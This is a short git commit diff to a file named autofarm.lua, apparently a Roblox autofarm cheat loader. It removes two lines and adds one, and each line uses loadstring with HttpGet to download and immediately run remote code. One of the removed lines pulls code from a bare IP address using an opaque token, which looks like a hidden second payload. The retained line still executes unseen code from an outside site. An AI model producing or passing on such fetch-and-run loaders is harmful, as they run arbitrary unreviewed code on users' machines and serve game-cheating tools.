c55cf2bf7bc83e4fff778c2b6c389622c8be9cec
createdreallol <116285995+createdreallol@users.noreply.github.com>
2026-07-24 10:37:48 -0400

    Update autofarm.lua

--- autofarm.lua
+++ autofarm.lua
@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM4MTM3ODUzLTFhZmEtNDFjZC1hNjQ0LTVmNWM1YjcwOWI2MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
-loadstring(game:HttpGet("http://84.200.89.110/SA4XEYTgr1LYIHcGKik3OsxylFMtklNIWPpKcj4PcnppENwYSGTh9G9B2CDK3COwym1Z2eXOqfNMBEp3"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM4MTM3ODUzLTFhZmEtNDFjZC1hNjQ0LTVmNWM1YjcwOWI2MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJzdW1tZXJldmVudCJ9fQ"))()
